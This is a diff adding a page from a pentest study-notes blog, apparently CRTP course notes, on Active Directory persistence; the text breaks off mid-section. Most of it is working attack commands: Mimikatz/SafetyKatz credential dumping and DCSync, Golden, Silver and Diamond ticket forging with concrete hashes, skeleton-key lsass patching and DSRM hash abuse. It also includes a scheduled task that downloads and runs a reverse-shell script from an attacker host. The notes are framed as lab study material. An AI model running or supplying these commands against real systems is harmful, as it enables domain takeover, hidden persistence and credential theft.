@@ -1,0 +1,1102 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>5 - AD Persistence |</title>
+<meta name="description" content="Golden, Silver, Diamond Tickets, Custom SSP, ACLs abuses and More ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="5 - AD Persistence">
+<meta property="og:url" content="http://localhost:4000/notes/crtp/domdom/">
+
+
+  <meta property="og:description" content="Golden, Silver, Diamond Tickets, Custom SSP, ACLs abuses and More ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-18T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/crtp/domdom/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          5 - AD Persistence
+
+        
+      </h1>
+      
+        <p class="page__lead">Golden, Silver, Diamond Tickets, Custom SSP, ACLs abuses and More
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  10 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/" class="active">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="5 - AD Persistence">
+    <meta itemprop="description" content="Golden, Silver, Diamond Tickets, Custom SSP, ACLs abuses and More">
+    <meta itemprop="datePublished" content="2023-12-18T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#ad-persistence">AD Persistence</a>
+    <ul>
+      <li><a href="#golden-ticket">Golden Ticket</a></li>
+      <li><a href="#silver-ticket">Silver Ticket</a></li>
+      <li><a href="#diamond-ticket">Diamond Ticket</a></li>
+      <li><a href="#skeleton-key">Skeleton Key</a></li>
+      <li><a href="#dsrm">DSRM</a></li>
+      <li><a href="#custom-ssp">Custom SSP</a></li>
+      <li><a href="#persistence-using-acls---adminsdholder">Persistence using ACLs - AdminSDHolder</a></li>
+      <li><a href="#acls---rights-abuse">ACLs - Rights Abuse</a></li>
+      <li><a href="#acls---security-descriptors">ACLs - Security Descriptors</a></li>
+      <li><a href="#wmi">WMI</a></li>
+      <li><a href="#powershell-remoting">PowerShell Remoting</a></li>
+      <li><a href="#remote-registry">Remote Registry</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="ad-persistence">AD Persistence</h1>
+
+<blockquote>
+  <p>DA is just the beggining
+We can add persistance, escalate to EA and attack across trusts!</p>
+</blockquote>
+
+<h2 id="golden-ticket">Golden Ticket</h2>
+
+<p><img src="/assets/images/posts/crtp/7.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>Skips the 1 e 2 steps</li>
+  <li>its a signed and encrypted by the hash of krbtgt account which validates the TGT ticket</li>
+  <li>the krbtgt account can be used to impersonate any user with any privileges from even a non-domain machine</li>
+</ul>
+
+<blockquote>
+  <p>its recommended to change the password of the krbtgt account twice as password history is maintained for the account</p>
+</blockquote>
+
+<h3 id="how-to-do-that">How to do that</h3>
+
+<p><strong>Execute mimikatz (or a variant) on DC as DA to get krbtgt hash</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>To use the DCSync feature for getting AES keys for krbtgt account</strong>.</p>
+
+<blockquote>
+  <p>Use the below command with DA privileges (or a user that has replication rights on the domain object):</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Using the DCSync option needs no code execution on the target DC</p>
+</blockquote>
+
+<p><strong>Run the below command to create a Golden ticket on any machine that has network connectivity with DC</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/posts/crtp/8.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/crtp/9.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>[obs] Always use an active domain admin to generate tickets
+preferable use /ptt and purge the ticket after use with klist purge</p>
+</blockquote>
+
+<p>Learning Objective 8</p>
+
+<ul>
+  <li>Extract secrets from the domain controller of dollarcorp.</li>
+  <li>Using the secrets of krbtgt account, create a Golden ticket.</li>
+  <li>Use the Golden ticket to (once again) get domain admin privileges from a machine.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="err">“</span><span class="nx">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:dcorp\krbtgt</span><span class="err">”</span><span class="w"> </span><span class="err">“</span><span class="nx">exit</span><span class="err">”</span><span class="w">	</span><span class="c"># [get the aes256 hash]</span><span class="w">
+
+</span><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d91 4cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+
+</span><span class="n">klist</span><span class="w"> </span><span class="c"># it shows the cached tickets</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="silver-ticket">Silver Ticket</h2>
+
+<p><img src="/assets/images/posts/crtp/10.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>A valid TGS (Golden ticket is TGT)</li>
+  <li>Encrypted and Signed by the hash of the service account</li>
+</ul>
+
+<blockquote>
+  <p>remember: Golden ticket is signed by hash of krbtgt</p>
+</blockquote>
+
+<ul>
+  <li>Services rarely check PAC (Privileged Attribute Certificate)</li>
+  <li>Services will allow access only to the services themselves</li>
+  <li>Reasonable persistence period (default 30 days for computer accounts)</li>
+</ul>
+
+<p><strong>Using hash of the Domain Controller computer account, below command provides access to file system on the DC</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Similar command can be used for any other service on a machine</strong>:</p>
+
+<blockquote>
+  <p>Which services? HOST, RPCSS, HTTP, WSMA and many more.</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/crtp/11.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/crtp/12.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>LAPS - control local admin credentials, does not control service accounts
+so, silver ticket will not be applied to laps</p>
+</blockquote>
+
+<ul>
+  <li>There are various ways of achieving command execution using Silver tickets</li>
+</ul>
+
+<p><strong>Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>This is Noisy</p>
+</blockquote>
+
+<p><strong>Schedule and execute a task</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT Authority\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"STCheck"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"</span><span class="w">
+</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"STCheck"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Learning Objective 9</p>
+
+<p>Try to get command execution on the domain controller by creating silver tickets for:</p>
+
+<ul>
+  <li>HOST service</li>
+  <li>WMI</li>
+</ul>
+
+<h2 id="diamond-ticket">Diamond Ticket</h2>
+
+<ul>
+  <li>its created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account</li>
+  <li>golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack</li>
+  <li>the persistence lifetime depends on krbtgt account</li>
+</ul>
+
+<p>A diamond ticket is more opsec safe as it has:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>→ valid ticket times because a TGT issued by the DC is modified
+→ in golden ticket, there is no corresponding TGT request for TGS/Service tickert requests as the TGT is forged
+</code></pre></div></div>
+
+<p>We would still need krbtgt AES keys. <strong>Use the following Rubeus command to create a diamond ticket</strong> (note that RC4 or AES keys of the user can be used too):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">diamond</span><span class="w"> </span><span class="nx">/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><span class="w"> </span><span class="nx">/user:studentx</span><span class="w"> </span><span class="nx">/password:StudentxPassword</span><span class="w"> </span><span class="nx">/enctype:aes</span><span class="w"> </span><span class="nx">/ticketuser:administrator</span><span class="w"> </span><span class="nx">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/dc:dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/ticketuserid:500</span><span class="w"> </span><span class="nx">/groups:512</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We could also use <strong>/tgtdeleg</strong> option in place of credentials in case we have access as a domain user:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">diamond</span><span class="w"> </span><span class="nx">/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><span class="w"> </span><span class="nx">/tgtdeleg</span><span class="w"> 	</span><span class="nx">/enctype:aes</span><span class="w"> </span><span class="nx">/ticketuser:administrator</span><span class="w"> </span><span class="nx">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/dc:dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/ticketuserid:500</span><span class="w"> </span><span class="nx">/groups:512</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Learning Objective 10</p>
+
+<ul>
+  <li>Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.</li>
+</ul>
+
+<h2 id="skeleton-key">Skeleton Key</h2>
+
+<blockquote>
+  <p>not recommended to do in an assessment
+<strong>Its not opsec safe</strong> and is also known to cause issues with AD CS</p>
+</blockquote>
+
+<ul>
+  <li>its a persistence technique where its possible to patch a Domain Controller <strong>(lsass process)</strong> so that it allows access as any user with a single password</li>
+</ul>
+
+<blockquote>
+  <p>not persistent across reboots</p>
+</blockquote>
+
+<p>Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice.</p>
+
+<blockquote>
+  <p>DA privileges required</p>
+  <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "misc::skeleton"'</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w">
+</span></code></pre></div>  </div>
+</blockquote>
+
+<p>Now, it is possible to access any machine with a valid username and password as <strong>mimikatz</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nx">dcorp\Administrator</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (<strong>mimidriv.sys</strong>) on disk of the target DC:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="w"> </span><span class="c"># privilege::debug</span><span class="w">
+</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># !+</span><span class="w">
+</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># !processprotect /process:lsass.exe /remove</span><span class="w">
+</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># misc::skeleton</span><span class="w">
+</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># !-</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[NOTE] That above would be <strong>very noisy in logs</strong> - Service installation (Kernel mode driver)</p>
+</blockquote>
+
+<p>You may like to modify the default key injected by Mimikatz!</p>
+
+<p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c#L611">Line 611 in kuhl_m_misc.c</a></p>
+
+<p>For example, to use <strong>S3c3rtP@ss</strong>, compute its RC4 and split it into 8 bytes stubs:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">56</span><span class="n">aa742a</span><span class="w">
+</span><span class="nx">6bebb9ca</span><span class="w">
+</span><span class="mi">62</span><span class="n">fc9f70</span><span class="w">
+</span><span class="nx">a2e00cd3</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Reverse the values by 2 bytes</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">2</span><span class="n">a74aa56</span><span class="w">
+</span><span class="nx">cab9eb6b</span><span class="w">
+</span><span class="mi">709</span><span class="n">ffc62</span><span class="w">
+</span><span class="nx">d30ce0a2</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Prepend 0x to each and modify kiwikey array value in the code linked above</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span><span class="w"> </span><span class="nx">kiwiKey</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="n">x2a74aa56</span><span class="p">,</span><span class="w"> </span><span class="nx">0xcab9eb6b</span><span class="p">,</span><span class="w"> </span><span class="nx">0x709ffc62</span><span class="p">,</span><span class="w"> </span><span class="nx">0xd30ce0a2</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="dsrm">DSRM</h2>
+<p>Directory Services Restore Mode</p>
+
+<ul>
+  <li>There is a local admin is every DC called <em>Administrator</em> whose password is the DSRM password</li>
+  <li>DSRM password (<strong>SafeModePassword</strong>) is required when a server is promoted to DC and its rarely changed</li>
+  <li>After altering the configuration on the DC, its possible to pass the NTLM hash of this user to access the DC</li>
+</ul>
+
+<p><strong>Dump DSRM password</strong>:</p>
+
+<blockquote>
+  <p>needs DA privs</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"token::elevate" "lsadump::sam"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Compare the Administrator hash with the Administrator hash of below command</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>First one is the DSRM local Administrator</p>
+</blockquote>
+
+<ul>
+  <li>Since it is the local administrator of the DC, we can pass the hash to authenticate.</li>
+</ul>
+
+<p>But, <strong>the Logon Behavior for the DSRM account needs to be changed before we can use its hash</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"DsrmAdminLogonBehavior"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="nx">DWORD</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Use below command to pass the hash</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'</span><span class="w"> 
+</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\dcorp-dc\C</span><span class="err">$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Learning Objective 11</p>
+
+<ul>
+  <li>Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.</li>
+</ul>
+
+<blockquote>
